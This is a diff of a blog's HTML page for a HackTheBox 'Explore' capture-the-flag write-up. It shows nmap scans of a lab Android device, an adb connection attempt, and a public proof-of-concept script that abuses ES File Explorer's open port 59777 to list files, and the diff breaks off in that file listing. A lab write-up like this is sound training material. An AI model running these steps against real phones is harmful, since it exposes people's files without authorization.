@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.118.2"><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,11 +14,11 @@
 
     <title>Explore Writeup (HackTheBox) | Doomdesire</title>
 
-    <link rel="stylesheet" href="/css/meme.min.47b7defd9dcca4589f4d279a79d656a7d334f973be4a3a4f1893fd20fc857df5.css"/>
+    <link rel="stylesheet" href="/css/meme.min.353693cdab7615152d304004b0e93d7af7fc743668040b9951ebb05d714ac96f.css"/>
 
     
     
-        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.a74e28464a7eeed54b4e02aead6360ae76bbd5ee5745afdf0a47319b6541600e.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.07eb0af6b6ace5741d44ee2fa3e3defd0fe88ef104f8c52f4ee23b1e0fe0b06d.js"></script>
 
     
 
@@ -287,7 +287,7 @@ Explore is an easy HackTheBox Android device created by <strong>bertolis</strong
 <p>We can start with the standard nmap, scanning the default ports:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -308,26 +308,26 @@ Explore is an easy HackTheBox Android device created by <strong>bertolis</strong
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sC -sV 10.10.10.247 -oN explore.nmap
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-27 08:07 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.247
-Host is up <span class="o">(</span>0.086s latency<span class="o">)</span>.
-Not shown: <span class="m">998</span> closed ports
-PORT     STATE    SERVICE VERSION
-2222/tcp open     ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
-<span class="p">|</span> fingerprint-strings: 
-<span class="p">|</span>   NULL: 
-<span class="p">|</span>_    SSH-2.0-SSH Server - Banana Studio
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>_  <span class="m">2048</span> 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb <span class="o">(</span>RSA<span class="o">)</span>
-5555/tcp filtered freeciv
-<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port2222-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>6/27%Time<span class="o">=</span>60D86A06%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
-SF:LL,24,<span class="s2">&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;</span><span class="o">)</span><span class="p">;</span>
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.63 seconds
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV 10.10.10.247 -oN explore.nmap
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-27 08:07 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.247
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.086s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
+</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE VERSION
+</span></span><span class="line"><span class="cl">2222/tcp open     ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NULL: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    SSH-2.0-SSH Server - Banana Studio
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">2048</span> 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl">5555/tcp filtered freeciv
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port2222-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>6/27%Time<span class="o">=</span>60D86A06%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
+</span></span><span class="line"><span class="cl">SF:LL,24,<span class="s2">&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.63 seconds
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="flags-used"><a href="#flags-used" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Flags used:</h3>
 <ul>
@@ -341,27 +341,27 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 <p>Moving to port 5555, it states to be filtered. As stated on the nmap page, the filtering could be from a dedicated firewall device, router rules, or host-based firewall software. Further googling about how port 5555 is related to Android devices, brought me to <a href="https://doublepulsar.com/root-bridge-how-thousands-of-internet-connected-android-devices-now-have-no-security-and-are-b46a68cb0f20" target="_blank" rel="noopener">this</a> article. It appears that multiple Android devices are getting shipped with Android Debug Bridge (ADB) enabled. ADB allows developers to communicate with a device remotely without the need to authenticate in order to run a variety of commands, including running shell commands as the highest prileged user, root.  Since this appears to be the case it is very possible that by connecting to this port, will give us root access to the device. To connect to this port we will need <strong>android-tools-adb</strong> which do not come pre-installed with Kali Linux. To install them we run:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">apt-get install android-tools-adb
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get install android-tools-adb
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>At this point we need to connect to this port with <code>adb</code>. To do this we run:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">adb connect 10.10.10.247:5555
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">adb connect 10.10.10.247:5555
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>This command hangs for a while and then eventually times out. It seems that this port is indeed filtered which means we won&rsquo;t be able connect to it. It is something to keep in mind since it&rsquo;s a way to get root on the device according to the article, however it is a dead end for the time being.</p>
 <h1 id="scanning-for-all-ports"><a href="#scanning-for-all-ports" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Scanning for all ports</h1>
 <p>Since nmap default port scan returned 2 ports that got us nowhere, a full port scan was the following step:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -374,23 +374,23 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -p- 10.10.10.247 -oN explorer.all-ports
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-27 08:10 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.247
-Host is up <span class="o">(</span>0.083s latency<span class="o">)</span>.
-Not shown: <span class="m">65530</span> closed ports
-PORT      STATE    SERVICE
-2222/tcp  open     EtherNetIP-1
-5555/tcp  filtered freeciv
-37103/tcp open     unknown
-42135/tcp open     unknown
-59777/tcp open     unknown
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- 10.10.10.247 -oN explorer.all-ports
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-27 08:10 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.247
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.083s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65530</span> closed ports
+</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE
+</span></span><span class="line"><span class="cl">2222/tcp  open     EtherNetIP-1
+</span></span><span class="line"><span class="cl">5555/tcp  filtered freeciv
+</span></span><span class="line"><span class="cl">37103/tcp open     unknown
+</span></span><span class="line"><span class="cl">42135/tcp open     unknown
+</span></span><span class="line"><span class="cl">59777/tcp open     unknown
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Scanning for all ports reveals 2 more ports we can enumerate (since port 37103 appears to be closed):</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -410,25 +410,25 @@ PORT      STATE    SERVICE
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -p 2222,5555,37103,42135,59777 10.10.10.247 -oN explorer.all-ports 
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-27 11:23 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.247
-Host is up <span class="o">(</span>0.091s latency<span class="o">)</span>.
-
-PORT      STATE    SERVICE VERSION
-2222/tcp  open     ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
-5555/tcp  filtered freeciv
-37103/tcp closed   unknown
-42135/tcp open     http    ES File Explorer Name Response httpd
-59777/tcp open     http    Bukkit JSONAPI httpd <span class="k">for</span> Minecraft game server 3.6.0 or older
-<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port2222-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>6/27%Time<span class="o">=</span>60D897F3%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
-SF:LL,24,<span class="s2">&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;</span><span class="o">)</span><span class="p">;</span>
-Service Info: Device: phone
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.45 seconds
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -p 2222,5555,37103,42135,59777 10.10.10.247 -oN explorer.all-ports 
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-27 11:23 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.247
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.091s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE VERSION
+</span></span><span class="line"><span class="cl">2222/tcp  open     ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">5555/tcp  filtered freeciv
+</span></span><span class="line"><span class="cl">37103/tcp closed   unknown
+</span></span><span class="line"><span class="cl">42135/tcp open     http    ES File Explorer Name Response httpd
+</span></span><span class="line"><span class="cl">59777/tcp open     http    Bukkit JSONAPI httpd <span class="k">for</span> Minecraft game server 3.6.0 or older
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port2222-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>6/27%Time<span class="o">=</span>60D897F3%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
+</span></span><span class="line"><span class="cl">SF:LL,24,<span class="s2">&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">Service Info: Device: phone
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.45 seconds
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h1 id="enumerating-port-59777"><a href="#enumerating-port-59777" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Enumerating port 59777</h1>
 <p>While searching online for information about port 42135 brought no results, searching for port 59777 instantly brought results. The result of the search was <a href="https://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port" target="_blank" rel="noopener">this</a> article which describes a vulnerability where Android ES File Explorer exposes user data through the open port 59777. This vulnerability, discovered by a security researcher named <a href="https://twitter.com/fs0c131y/status/1085460755313508352" target="_blank" rel="noopener">Baptiste Robert</a> allows anyone connected to the same local network to remotely get a file from the device using ES File Explorer. Moreover, a POC python script can also be found <a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln" target="_blank" rel="noopener">here</a>. It seems this is our way of listing the device&rsquo;s files.</p>
@@ -439,7 +439,7 @@ There are multiple commands available to the script, however the most useful app
 The first command to try was listFiles:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -469,42 +469,42 @@ The first command to try was listFiles:</p>
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python poc.py --cmd listFiles --host 10.10.10.247 <span class="p">|</span> grep file
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vndservice_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;65.00 Bytes (65 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vendor_service_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vendor_seapp_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vendor_property_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;392.00 Bytes (392 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vendor_hwservice_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vendor_file_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;6.92 KB (7,081 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;ueventd.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;5.00 KB (5,122 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;ueventd.android_x86_64.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;464.00 Bytes (464 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;sepolicy&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;357.18 KB (365,756 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;plat_service_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;13.73 KB (14,057 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;plat_seapp_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;1.28 KB (1,315 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;plat_property_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;6.53 KB (6,687 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;plat_hwservice_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;7.04 KB (7,212 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;plat_file_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;23.30 KB (23,863 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.zygote64_32.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;875.00 Bytes (875 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.zygote32.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;511.00 Bytes (511 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.usb.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;5.51 KB (5,646 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.usb.configfs.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;7.51 KB (7,690 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.superuser.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;582.00 Bytes (582 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;29.00 KB (29,697 Bytes)&#34;</span>, <span class="o">}</span>, 
